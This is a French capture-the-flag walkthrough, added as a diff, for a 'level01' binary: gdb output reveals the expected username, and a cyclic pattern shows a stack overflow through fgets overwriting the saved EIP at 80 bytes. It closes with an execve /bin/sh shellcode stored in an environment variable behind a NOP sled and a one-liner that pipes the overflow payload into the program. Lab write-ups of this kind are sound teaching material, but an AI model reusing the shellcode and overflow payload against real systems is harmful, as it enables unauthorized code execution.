@@ -1,0 +1,52 @@
+
+
+Le premier input demandé est l'USERNAME.
+
+L'analyse de l'assembleur nous informe que "dat_wil" est attendu en tant qu'USERNAME :
+
+---
+
+(gdb) x/s 0x80486a8
+0x80486a8: "dat_wil"
+
+---
+
+Si "dat_wil" est rentré, on nous demandénde ensuite le PASSWORD.
+Le mot de passe attendu est : "admin".
+Mais celui-ci ne permet pas d'avoir le .pass.
+
+On va devoir utiliser un shellcode.
+
+Pour l'USERNAME, l'input utilisateur est stocké dans une variable (globale ?).
+Pour le PASSWORD, il est stocké à cet emplacement :
+804856d:       8d 44 24 1c             lea    eax,[esp+0x1c]
+8048571:       89 04 24                mov    DWORD PTR [esp],eax
+
+Cette adresse est donnée en paramètre a fgets. La taille donnée à fgets est 100.
+
+N'y a-t-il pas une possibilité de réécrire un eip sauvegardé (pour retour de fonction) sur la stack ?
+Que se passe-t-il si on donne à fgets un input égale à 100 ?
+Et bien un eip sauvegardé est réécrit :
+
+---
+(gdb) r
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+---
+
+L'eip est réécrit à partir de 80 octets.
+
+$(python -c 'print "export SHELLCODE=" + "\x90"*100 + "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80"')
+
+(python -c 'print "dat_wil"' ; python -c 'print "A" * 80 + "adresse du Shellcode"' ; cat) | ./level01
